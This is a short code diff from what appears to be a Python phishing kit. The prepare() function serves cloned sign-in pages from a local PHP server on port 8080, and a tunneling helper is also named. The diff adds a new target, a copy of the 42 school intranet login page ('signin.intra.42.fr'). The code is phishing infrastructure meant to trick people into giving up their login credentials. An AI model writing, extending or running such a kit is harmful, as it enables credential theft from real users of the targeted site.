@@ -37,6 +37,8 @@ def tunneling():
 def prepare(pfm,loop_count):
 	os.system("clear")
 	try:
+		if (pfm == "intra42"):
+			pfm = "intra42/signin.intra.42.fr/users"
 		print(colors.YELLOW+" ' Ctrl + C ' for back to menu \n")
 		print("System : "+colors.GREEN+"active \n"+colors.YELLOW+"Running : "+colors.GREEN+"localhost:8080 >>>  {}".format(pfm)+colors.BLACK)
 		php = "php -S localhost:8080 -t sites/{} > /dev/null 2>log&".format(pfm)
